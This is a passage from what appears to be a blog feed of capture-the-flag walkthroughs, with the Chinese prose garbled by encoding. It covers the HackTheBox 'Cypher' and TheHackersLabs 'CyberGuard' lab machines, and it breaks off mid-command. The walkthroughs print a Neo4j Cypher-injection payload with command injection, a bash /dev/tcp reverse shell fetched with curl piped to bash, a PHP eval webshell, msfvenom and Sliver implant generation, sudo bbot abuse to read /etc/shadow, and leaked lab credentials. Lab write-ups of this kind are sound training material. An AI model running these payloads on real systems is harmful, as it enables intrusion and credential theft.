ç„¶åå¯ä»¥é€šè¿‡`custom` ç”¨æ¥å¼•ç”¨è‡ªå®šä¹‰çš„ç¨‹åºæˆ–å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢å¸¦æœ‰å‘½ä»¤æ‰§è¡Œçš„æ–¹æ³• https://neo4j.com/labs/apoc/4.1/cypher-execution/cypher-based-procedures-functions/

æˆåŠŸå¸¦å¤–ï¼Œä½†æ˜¯æ— å›æ˜¾

```bash
{
	"username":"' return h.value as a UNION CALL custom.getUrlStatusCode(\"http://10.10.16.34;whoami\") YIELD statusCode AS a RETURN a;//",
	"password":"1" 
}
```

æ„é€ `payload`

1. åœ¨kaliåˆ›å»ºå¸¦æœ‰åå¼¹shellè¯­å¥çš„æ–‡ä»¶shell.txtï¼ˆè®©æœåŠ¡å™¨è®¿é—®ï¼‰
    
    ```bash
    /bin/bash -c 'bash -i >& /dev/tcp/10.10.16.34/1234 0>&1'
    ```
    
2. å¼€å¯ç›‘å¬
    
    ```bash
    âš¡ root@kali î‚° ~/Desktop/test/cypher î‚° nc -lvnp 1234
    listening on [any] 1234 ...
    ```
    
3. å¼€å¯ç®€æ˜“æœåŠ¡å™¨
4. æ„é€ `payload`
    
    ```bash
    {
    	"username":"' return h.value as a UNION CALL custom.getUrlStatusCode(\"http://10.10.16.34;curl http://10.10.16.34/shell.txt|bash\") YIELD statusCode AS a RETURN a;//",
    	"password":"1" 
    }
    ```
    
    æˆåŠŸè·å¾—`shell`
    
    ![image.png](/post-images/HackTheBoxSeason7-Cypher/image33.png)
    

## ææƒ

ä¿¡æ¯æ”¶é›†ä¸€æ³¢

```bash
neo4j@cypher:/home/graphasm$ ls -al
total 56
drwxr-xr-x 9 graphasm graphasm 4096 Mar  2 13:01 .
drwxr-xr-x 3 root     root     4096 Oct  8 17:58 ..
lrwxrwxrwx 1 root     root        9 Oct  8 18:06 .bash_history -> /dev/null
-rw-r--r-- 1 graphasm graphasm  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 graphasm graphasm 3771 Mar 31  2024 .bashrc
drwxrwxr-x 8 graphasm graphasm 4096 Mar  2 11:35 .bbot
-rw-r--r-- 1 graphasm graphasm  156 Feb 14 12:35 bbot_preset.yml
drwx------ 3 graphasm graphasm 4096 Mar  2 11:35 .cache
drwxrwxr-x 3 graphasm graphasm 4096 Mar  2 11:18 .config
drwx------ 3 graphasm graphasm 4096 Mar  2 13:01 .gnupg
drwxrwxr-x 3 graphasm graphasm 4096 Mar  2 11:20 .local
-rw-r--r-- 1 graphasm graphasm  807 Mar 31  2024 .profile
drwx------ 2 graphasm graphasm 4096 Oct  8 17:58 .ssh
drwxrwxr-x 8 graphasm graphasm 4096 Mar  2 13:38 testoutput
-rw-r----- 1 root     graphasm   33 Mar  2 11:16 user.txt
```

bbot_preset.yml å¾—åˆ°ä¸€ç»„è´¦å·å¯†ç 

```bash
neo4j@cypher:/home/graphasm$ cat bbot_preset.yml
targets:
  - ecorp.htb

output_dir: /home/graphasm/bbot_scans

config:
  modules:
    neo4j:
      username: neo4j
      password: cU4btyib.20xtCMCXkBmerhK
```

ä½†æ˜¯ä½¿ç”¨`neo4j`ç™»é™†ä¸æˆåŠŸï¼Œå¯†ç ç¢°æ’ä½¿ç”¨`graphasm`ç™»é™†æˆåŠŸ

```bash
âš¡ root@kali î‚° ~/Desktop/test/cypher î‚° ssh graphasm@10.10.11.57                            
graphasm@10.10.11.57's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-53-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Mar  2 03:13:58 PM UTC 2025

  System load:  0.0               Processes:             243
  Usage of /:   74.2% of 8.50GB   Users logged in:       1
  Memory usage: 66%               IPv4 address for eth0: 10.10.11.57
  Swap usage:   0%

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun Mar 2 15:13:59 2025 from 10.10.16.34
graphasm@cypher:~$ 
```

åœ¨å®¶ç›®å½•ä¸‹å¯ä»¥è¯»å–`UserFlag`

```bash
graphasm@cypher:~$ cat user.txt 
63a155f3be93bac8eec086ec22459b65
```

æŸ¥çœ‹graphasmç”¨æˆ·æƒé™

```bash
graphasm@cypher:~$ sudo -l
Matching Defaults entries for graphasm on cypher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
```

æŸ¥çœ‹`bbot`å¸®åŠ©

```bash
graphasm@cypher:~$ sudo /usr/local/bin/bbot   
  ______  _____   ____ _______               
 |  ___ \|  __ \ / __ \__   __|                                                                                                                                                                                    
 | |___) | |__) | |  | | | |                                                                             
 |  ___ <|  __ <| |  | | | |                  
 | |___) | |__) | |__| | | |                                                                             
 |______/|_____/ \____/  |_|                                                                             
 BIGHUGE BLS OSINT TOOL v2.1.0.4939rc                                                                    
                                                                                                         
www.blacklanternsecurity.com/bbot                                                                        
                                                                                                         
usage: bbot [-h] [-t TARGET [TARGET ...]] [-w WHITELIST [WHITELIST ...]] [-b BLACKLIST [BLACKLIST ...]] [--strict-scope] [-p [PRESET ...]] [-c [CONFIG ...]] [-lp] [-m MODULE [MODULE ...]] [-l] [-lmo]
            [-em MODULE [MODULE ...]] [-f FLAG [FLAG ...]] [-lf] [-rf FLAG [FLAG ...]] [-ef FLAG [FLAG ...]] [--allow-deadly] [-n SCAN_NAME] [-v] [-d] [-s] [--force] [-y] [--dry-run] [--current-preset]
            [--current-preset-full] [-o DIR] [-om MODULE [MODULE ...]] [--json] [--brief] [--event-types EVENT_TYPES [EVENT_TYPES ...]]
            [--no-deps | --force-deps | --retry-deps | --ignore-failed-deps | --install-all-deps] [--version] [-H CUSTOM_HEADERS [CUSTOM_HEADERS ...]] [--custom-yara-rules CUSTOM_YARA_RULES]
                                                    
Bighuge BLS OSINT Tool                                                                                   
                                                                                                         
options:                                                                                                 
  -h, --help            show this help message and exit
                                                                                                         
Target:                
  -t TARGET [TARGET ...], --targets TARGET [TARGET ...]                             
                        Targets to seed the scan
  -w WHITELIST [WHITELIST ...], --whitelist WHITELIST [WHITELIST ...]
                        What's considered in-scope (by default it's the same as --targets)
  -b BLACKLIST [BLACKLIST ...], --blacklist BLACKLIST [BLACKLIST ...]
                        Don't touch these things                                                         
  --strict-scope        Don't consider subdomains of target/whitelist to be in-scope                                                                                                                               
                                                                                                         
Presets:                                           
  -p [PRESET ...], --preset [PRESET ...]                                                                 
                        Enable BBOT preset(s)                                                            
  -c [CONFIG ...], --config [CONFIG ...]                                                                                                                                                                           
                        Custom config options in key=value format: e.g. 'modules.shodan.api_key=1234'    
  -lp, --list-presets   List available presets.     
                                                                                                         
Modules:                                                                                                 
  -m MODULE [MODULE ...], --modules MODULE [MODULE ...]                                                  
                        Modules to enable. Choices: dnsbrute,paramminer_headers,github_org,ipneighbor,chaos,securitytxt,viewdns,baddns,ip2location,wpscan,bypass403,generic_ssrf,certspotter,urlscan,badsecrets,cre
dshed,dastardly,asn,postman_download,virustotal,columbus,ntlm,c99,internetdb,httpx,git_clone,trufflehog,bucket_file_enum,subdomaincenter,filedownload,github_workflows,code_repository,trickest,fingerprintx,newsle
tters,ffuf,anubisdb,crt,bucket_firebase,nuclei,portscan,unstructured,bucket_amazon,pgp,ffuf_shortnames,paramminer_cookies,azure_tenant,censys,dnscommonsrv,zoomeye,securitytrails,bucket_digitalocean,azure_realm,i
is_shortnames,bucket_azure,binaryedge,dnscaa,wayback,affiliates,url_manipulation,gowitness,otx,docker_pull,github_codesearch,telerik,gitlab,secretsdb,dnsbrute_mutations,myssl,emailformat,digitorus,paramminer_get
params,bevigil,fullhunt,vhost,oauth,hunt,dnsdumpster,passivetotal,baddns_zone,host_header,sitedossier,shodan_dns,bucket_google,social,wappalyzer,wafw00f,leakix,hackertarget,rapiddns,sslcert,git,robots,dotnetnuke
,skymem,baddns_direct,smuggler,builtwith,ipstack,postman,dehashed,hunterio,ajaxpro,dockerhub             
  -l, --list-modules    List available modules.                                                                                                                                                                    
  -lmo, --list-module-options                                                                            
                        Show all module config options        
  -em MODULE [MODULE ...], --exclude-modules MODULE [MODULE ...]                                         
                        Exclude these modules.
  -f FLAG [FLAG ...], --flags FLAG [FLAG ...]
                        Enable modules by flag. Choices: iis-shortnames,social-enum,service-enum,portscan,web-screenshots,slow,subdomain-enum,affiliates,web-thorough,safe,cloud-enum,web-paramminer,active,baddns,
deadly,aggressive,code-enum,subdomain-hijack,passive,web-basic,report,email-enum                         
  -lf, --list-flags     List available flags. 
  -rf FLAG [FLAG ...], --require-flags FLAG [FLAG ...]                                                   
                        Only enable modules with these flags (e.g. -rf passive)                          
  -ef FLAG [FLAG ...], --exclude-flags FLAG [FLAG ...]                                                   
                        Disable modules with these flags. (e.g. -ef aggressive)                          
  --allow-deadly        Enable the use of highly aggressive modules                                      
                                                                                                         
Scan:                                                                                                                                                                                                              
  -n SCAN_NAME, --name SCAN_NAME                                                                                                                                                                                   
                        Name of scan (default: random)                                                                                                                                                             
  -v, --verbose         Be more verbose                                                                                                                                                                            
  -d, --debug           Enable debugging            
  -s, --silent          Be quiet                                                                         
  --force               Run scan even in the case of condition violations or failed module setups        
  -y, --yes             Skip scan confirmation prompt                                                    
  --dry-run             Abort before executing scan                                                      
  --current-preset      Show the current preset in YAML format                                           
  --current-preset-full
                        Show the current preset in its full form, including defaults
                                                    
Output:                                                                                                  
  -o DIR, --output-dir DIR                                                                               
                        Directory to output scan results             
  -om MODULE [MODULE ...], --output-modules MODULE [MODULE ...]                                          
                        Output module(s). Choices: csv,discord,splunk,websocket,subdomains,txt,teams,emails,http,neo4j,asset_inventory,stdout,web_report,python,slack,json                                         
  --json, -j            Output scan data in JSON format   
  --event-types EVENT_TYPES [EVENT_TYPES ...]                                                            
                        Choose which event types to display                                              
                                                                                                                                                                                                                   
Module dependencies:                                                                                     
  Control how modules install their dependencies    
                                                                                                         
  --no-deps             Don't install module dependencies                                                
  --force-deps          Force install all module dependencies                                            
  --retry-deps          Try again to install failed module dependencies                                                                                                                                            
  --ignore-failed-deps  Run modules even if they have failed dependencies                                                                                                                                          
  --install-all-deps    Install dependencies for all modules                                                                                                                                                       
                                                                                                                                                                                                                   
Misc:                                                                                                                                                                                                              
  --version             show BBOT version and exit                                                       
  -H CUSTOM_HEADERS [CUSTOM_HEADERS ...], --custom-headers CUSTOM_HEADERS [CUSTOM_HEADERS ...]                                                                                                                     
                        List of custom headers as key value pairs (header=value).                        
  --custom-yara-rules CUSTOM_YARA_RULES, -cy CUSTOM_YARA_RULES
                        Add custom yara rules to excavate                                                
                                                    
EXAMPLES                                     
                                                                                                                                                                                                                   
    Subdomains:                                                                                          
        bbot -t evilcorp.com -p subdomain-enum
                                                                                                         
    Subdomains (passive only):                                                                           
        bbot -t evilcorp.com -p subdomain-enum -rf passive                                               
                                                                                                         
    Subdomains + port scan + web screenshots:                                                            
        bbot -t evilcorp.com -p subdomain-enum -m portscan gowitness -n my_scan -o .                     
                                                                                                                                                                                                                   
    Subdomains + basic web scan:                                                                                                                                                                                   
        bbot -t evilcorp.com -p subdomain-enum web-basic                                                                                                                                                           
                                                                                                                                                                                                                   
    Web spider:                                     
        bbot -t www.evilcorp.com -p spider -c web.spider_distance=2 web.spider_depth=2                   
                                                                                                         
    Everything everywhere all at once:                                                                   
        bbot -t evilcorp.com -p kitchen-sink                                                             
                                                                                                         
    List modules:      
        bbot -l                                                                                          
                                                    
    List presets:                                                                                        
        bbot -lp                                                                                         
                                                                                                         
    List flags:                                                                                          
        bbot -lf                                                                                        
```

æ„é€ ä»»æ„æ–‡ä»¶è¯»å–

è¯»å–æ–‡ä»¶å¤§ç‚¹çš„æ–‡ä»¶ï¼Œå®¹æ˜“çœ‹è§è¾“å‡º

```bash
graphasm@cypher:~$ sudo /usr/local/bin/bbot -cy /etc/shadow -d 
```

![image.png](/post-images/HackTheBoxSeason7-Cypher/image34.png)

è¯»å–`root.txt`

```bash
graphasm@cypher:~$ sudo /usr/local/bin/bbot -cy /root/root.txt -d 
```

```bash
63582a9da70699c87d6bd78e92aa9a71
```

![image.png](/post-images/HackTheBoxSeason7-Cypher/image35.png)
]]></content:encoded>
            <category>é¶æœº</category>
            <category>HackTheBox</category>
            <category>Linuxé¶æœº</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - CyberGuard]]></title>
            <link>https://www.sunsetaction.top/2025/07/28/TheHackersLabsCyberGuard</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/07/28/TheHackersLabsCyberGuard</guid>
            <pubDate>Mon, 28 Jul 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[CyberGuard https://labs.thehackerslabs.com/machine/25 ä¸€å…±æœ‰å››å°æœºå­ï¼šç¬¬ä¸€å°æ˜¯åšè·¯ç”±å™¨/é˜²ç«å¢™ã€‚å…¶ä½™ä¸‰å°å†…ç½‘ä¸»æœºã€‚ Recon PortScan æšä¸¾ HTTP æœåŠ¡ ç›®å½•çˆ†ç ´ï¼Œè¿™é‡Œæ‰«æä¹…äº†ä¼šè¢« ban æ‰ è¿™ä¸ª query å’Œè¾“å‡ºç»“æœæ„Ÿè§‰æœ‰è‚¡ç†Ÿ...]]></description>
            <content:encoded><![CDATA[
# CyberGuard

> https://labs.thehackerslabs.com/machine/25
> 

![image.png](/post-images/TheHackersLabsCyberGuard/image.png)

ä¸€å…±æœ‰å››å°æœºå­ï¼šç¬¬ä¸€å°æ˜¯åšè·¯ç”±å™¨/é˜²ç«å¢™ã€‚å…¶ä½™ä¸‰å°å†…ç½‘ä¸»æœºã€‚

![image.png](/post-images/TheHackersLabsCyberGuard/image1.png)

## Recon

### PortScan

```bash
âœ  CyberGuard nmap -sn 10.0.2.0/24                   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 21:11 CST
Nmap scan report for 10.0.2.1
Host is up (0.00072s latency).
MAC Address: 0A:00:27:00:00:11 (Unknown)
Nmap scan report for 10.0.2.10
Host is up (0.00047s latency).
MAC Address: 08:00:27:B3:85:B4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 10.0.2.20
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.21 seconds
```

```bash
âœ  CyberGuard nmap -sT -min-rate 10000 -p- 10.0.2.10
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 21:11 CST
Nmap scan report for 10.0.2.10
Host is up (0.0013s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:B3:85:B4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 13.54 seconds
```

```bash
âœ  CyberGuard nmap -sT -A -p 80 10.0.2.10                                                       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 21:12 CST
Nmap scan report for 10.0.2.10
Host is up (0.00056s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx
|_http-title: Site doesn't have a title (application/octet-stream, text/plain; charset=UTF-8).
MAC Address: 08:00:27:B3:85:B4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): FreeBSD 11.X (92%)
OS CPE: cpe:/o:freebsd:freebsd:11.2
Aggressive OS guesses: FreeBSD 11.2-RELEASE (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.56 ms 10.0.2.10

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.56 seconds
```

### æšä¸¾

`HTTP` æœåŠ¡

![image.png](/post-images/TheHackersLabsCyberGuard/image2.png)

ç›®å½•çˆ†ç ´ï¼Œè¿™é‡Œæ‰«æä¹…äº†ä¼šè¢« ban æ‰

```bash
âœ  CyberGuard gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip -u http://10.0.2.10
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.2.10
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 274]
/index.php            (Status: 200) [Size: 1048]
/search               (Status: 200) [Size: 2046]
/admin                (Status: 302) [Size: 378] [--> http://10.0.2.10/admin/auth/login]
/up                   (Status: 200) [Size: 2130]
```

è¿™ä¸ª `query` å’Œè¾“å‡ºç»“æœæ„Ÿè§‰æœ‰è‚¡ç†Ÿæ‚‰çš„å‘³

![image.png](/post-images/TheHackersLabsCyberGuard/image3.png)

`sqlmap` è·‘ä¸€æ³¢

```bash
sqlmap -r packet -batch --level 3 --risk 3
```

çœŸè·‘å‡ºæ¥äº†ï¼Œåœ¨ `UA` ä¸­å­˜åœ¨æ³¨å…¥ç‚¹

![image.png](/post-images/TheHackersLabsCyberGuard/image4.png)

## SQL Injection

ä½¿ç”¨ `sqlmap` ç›´æ¥å…¨ç»™çˆ†å‡ºæ¥

```bash
current database: 'cyberguard
current user: 'ian@localhost'

+------------------------+
| cache                  |
| admin_menu             |
| admin_operation_log    |
| admin_permissions      |
| admin_role_menu        |
| admin_role_permissions |
| admin_role_users       |
| admin_roles            |
| admin_user_permissions |
| admin_users            |
| blacklist_user_agents  |
| cache_locks            |
| failed_jobs            |
| job_batches            |
| jobs                   |
| migrations             |
| password_reset_tokens  |
| sessions               |
| users                  |
+------------------------+

# admin_user
+----+---------------+--------+--------------------------------------------------------------+----------+---------------------+---------------------+----------------+
| id | name          | avatar | password                                                     | username | created_at          | updated_at          | remember_token |
+----+---------------+--------+--------------------------------------------------------------+----------+---------------------+---------------------+----------------+
| 1  | Administrator | NULL   | $2y$12$fN2GC9IgrwHneBpWIY8WwevYshq/qkEhoE6XhU7ClZInAhbW2YltK | admin    | 2024-10-01 17:41:30 | 2024-10-09 02:31:19 | NULL           |
+----+---------------+--------+--------------------------------------------------------------+----------+---------------------+---------------------+----------------+

```

çˆ†ç ´ä¸€ä¸‹å¯†ç 

```bash
âœ  CyberGuard john --wordlist=/usr/share/wordlists/rockyou.txt hash       
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
killer           (?)     
1g 0:00:00:04 DONE (2025-07-27 21:48) 0.2415g/s 34.78p/s 34.78c/s 34.78C/s shadow..sandra
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

å¾—åˆ°æ˜æ–‡å¯†ç  `killer`

## åå°åˆ©ç”¨

æ¥åˆ°ç½‘ç«™åå°å°è¯•è¿›è¡Œç™»å½•

æˆåŠŸè¿›å…¥åå°

![image.png](/post-images/TheHackersLabsCyberGuard/image5.png)

åå°é‡Œé¢æœ‰ä¸ªå‘½ä»¤æ‰§è¡Œçš„åŠŸèƒ½ï¼ˆå›¾ä¸­çš„ `shell`ï¼‰

æˆåŠŸæ‰§è¡Œå‘½ä»¤

![image.png](/post-images/TheHackersLabsCyberGuard/image6.png)

å†æ‹¿ `/etc/passwd` çš„ä¿¡æ¯ï¼Œèƒ½çŸ¥é“ `ian` ç”¨æˆ·æ˜¯å­˜åœ¨çš„

```bash
ian:x:1000:1000:ian,,,:/home/ian:/bin/bash
```

### å°è¯• 1 âŒ

å°è¯•åå¼¹ `shell` ï¼Œè¿™é‡Œä½¿ç”¨ `nc` å’Œ `/bin/bash` éƒ½æ— æ³•å¼¹å‡ºæ¥ï¼Œä¸€ç›´åœ¨åŠ è½½

åå°è¿˜æœ‰ä¸€ä¸ªä¸Šä¼ åŠŸèƒ½ç‚¹ï¼Œä½†æ˜¯æ²¡æ‰¾åˆ°ä¸Šä¼ çš„æ–‡ä»¶å¤¹åœ¨å“ª

![image.png](/post-images/TheHackersLabsCyberGuard/image7.png)

å°è¯•ä½¿ç”¨å‘½ä»¤è¡Œæ¥æ‰¾åˆ°ä¸Šä¼ çš„æ–‡ä»¶å¤¹åœ¨å“ª

```bash
find / -name 'result.php' 2>/dev/null
```

é€šè¿‡ find å‘½ä»¤èƒ½æ‰¾åˆ°å­˜æ”¾åœ¨ `/var/www/cyberguard/storage/app/private/result.php`

![image.png](/post-images/TheHackersLabsCyberGuard/image8.png)

å†çœ‹ä¸€ä¸‹å½“å‰ç›®å½•åœ¨å“ªï¼Œåœ¨ `/var/www/cyberguard/public`

![image.png](/post-images/TheHackersLabsCyberGuard/image9.png)

æˆ‘ä»¬åº”è¯¥æ˜¯æ²¡æœ‰åŠæ³•åˆ‡æ¢è¿‡å»

æ‰€ä»¥è¿™é‡Œå°è¯•ç›´æ¥å†™å…¥`webshell`

```bash
echo '<?php eval($_POST["x"]);phpinfo();?>' > test.php
```

å¯ä»¥æ‰§è¡Œå‘½ä»¤

![image.png](/post-images/TheHackersLabsCyberGuard/image10.png)

ä½†ç»“æœè¿˜æ˜¯æ— æ³•è¿›è¡Œåå¼¹ `shell` ï¼Œè¢«é˜»æ­¢

### å°è¯• 2 âŒ

å°è¯•ä½¿ç”¨ `MSF` æ¥æ‹¿åˆ° `shell`

```bash
âœ  CyberGuard msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.2.20 LPORT=4444 -f elf -o sunset
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: sunset
```

ä¸Šä¼ ååœ¨å‘½ä»¤æ‰§è¡Œçª—å£æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤

```bash
chmod +x /var/www/cyberguard/storage/app/private/sunset
/var/www/cyberguard/storage/app/private/sunset
```

è¿™é‡Œè¿˜å°è¯•å¾ˆå¤šç§`payload` ï¼Œä¾‹å¦‚`cmd/linux/http/x64/meterpreter_reverse_http`  ç­‰

ä½†æ˜¯ç»“æœå’Œåœ¨ `WebShell` åå¼¹ä¸€æ ·ï¼Œè¢«é˜»æ­¢äº†

### å°è¯• 3 âœ…

è¿™é‡Œå°è¯•ä½¿ç”¨ `sliver` 

> https://github.com/BishopFox/sliver
> 

`sliver` æœ‰å¾ˆé«˜çš„éšè”½æ€§å’Œå…æ€æ€§èƒ½ï¼Œå¹¶ä¸”ä¹Ÿæ”¯æŒå…¶ä»–çš„åè®®

```bash
âœ  CyberGuard sliver
Connecting to localhost:31337 ...

    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—     â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—
    â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—
    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•
    â•šâ•â•â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—
    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘
    â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•â•â•  â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•

All hackers gain persist
[*] Server v1.5.43 - e116a5ec3d26e8582348a29cfd251f915ce4a405
[*] Welcome to the sliver shell, please type 'help' for options

[*] Check for updates with the 'update' command

sliver >  
```

ä½¿ç”¨ `WireGuard` åè®®ç”Ÿæˆæ¤å…¥ç‰©å¹¶ç›‘å¬

```bash
sliver > generate --wg 10.0.2.20 -o linux -a amd64 -f binary

[*] Generated unique ip for wg peer tun interface: 100.64.0.2
[*] Generating new linux/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 1m12s
[*] Implant saved to /root/Desktop/TheHackersLabs/CyberGuard/FORMIDABLE_FLOOR

sliver > wg

[*] Starting Wireguard listener ...
[*] Successfully started job #1
```

ä¸Šä¼ åˆ°é¶æœºå¹¶è¿è¡Œ

```bash
chmod +x /var/www/cyberguard/storage/app/private/FORMIDABLE_FLOOR
/var/www/cyberguard/storage/app/private/FORMIDABLE_FLOOR
```

ç„¶åå¯ä»¥åœ¨ `sliver` æœåŠ¡ç«¯ä¸­çœ‹åˆ°è¿æ¥ä¸Šå»äº†

![image.png](/post-images/TheHackersLabsCyberGuard/image11.png)

å’Œ `MSF` å·®ä¸å¤šçš„æ“ä½œ

![image.png](/post-images/TheHackersLabsCyberGuard/image12.png)

## å†…ç½‘æ¸—é€

### ä¿¡æ¯æ”¶é›†

æˆ‘ä»¬æŸ¥çœ‹ `databases.php` 

```bash
'default' => [
            'url' => env('REDIS_URL'),
            'host' => env('REDIS_HOST', '127.0.0.1'),
            'username' => env('REDIS_USERNAME'),
            'password' => env('REDIS_PASSWORD'),
            'port' => env('REDIS_PORT', '6379'),
            'database' => env('REDIS_DB', '0'),
        ],
```

å‘ç°æ•°æ®åº“å‡­æ®å­˜æ”¾åœ¨ç¯å¢ƒå˜é‡ä¸­

```bash
DB_PASSWORD=ZqBHR4MZ<f*+bv(J
REDIS_HOST=127.0.0.1
DB_HOST=127.0.0.1
QUEUE_CONNECTION=database
```

å¾—åˆ°ä¸€ä¸²å¯†ç  `ZqBHR4MZ<f*+bv(J`

ç»è¿‡æµ‹è¯•æˆ‘ä»¬çŸ¥é“å¯†ç æ˜¯ `ian` è´¦æˆ·çš„

```bash
[*] Started remote shell with pid 1069

www-data@TheHackersLabs-2-Cyberguard:/var/www/cyberguard/config$ su ian
Password: 
ian@TheHackersLabs-2-Cyberguard:/var/www/cyberguard/config$ 
```

æŸ¥çœ‹æ­£åœ¨ç›‘å¬çš„ç«¯å£

```bash
ian@TheHackersLabs-2-Cyberguard:~$ ss -tulpn
Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                                             
udp   UNCONN 0      0            0.0.0.0:59645      0.0.0.0:*                                                       
udp   UNCONN 0      0            0.0.0.0:51236      0.0.0.0:*    users:(("ss",pid=1098,fd=7),("bash",pid=1082,fd=7))
udp   UNCONN 0      0               [::]:51236         [::]:*    users:(("ss",pid=1098,fd=3),("bash",pid=1082,fd=3))
tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*                                                       
tcp   LISTEN 0      80         127.0.0.1:3306       0.0.0.0:*                                                       
tcp   LISTEN 0      128             [::]:22            [::]:*                                                       
tcp   LISTEN 0      511                *:8080             *:*  
```

æŸ¥çœ‹ `ip` ï¼Œå¾—åˆ°å†…ç½‘ç½‘æ®µ `10.20.30.0/24`

```bash
www-data@TheHackersLabs-2-Cyberguard:/var/www/cyberguard/config$ ip add
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:f1:07:77 brd ff:ff:ff:ff:ff:ff
    inet 10.20.30.11/24 brd 10.20.30.255 scope global enp0s3
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:fef1:777/64 scope link 
       valid_lft forever preferred_lft forever
```

### æ­å»ºä»£ç†

æ–¹ä¾¿æ¸—é€å†…ç½‘ä¸»æœºï¼Œè¿™é‡Œä½¿ç”¨ `sliver`  æ­å»ºä»£ç†

æ–‡æ¡£é“¾æ¥ï¼šhttps://sliver.sh/docs?name=Reverse+SOCKS

è¿™é‡Œä½¿ç”¨ `WireGuard SOCKS5`

```bash
sliver (FORMIDABLE_FLOOR) > info 

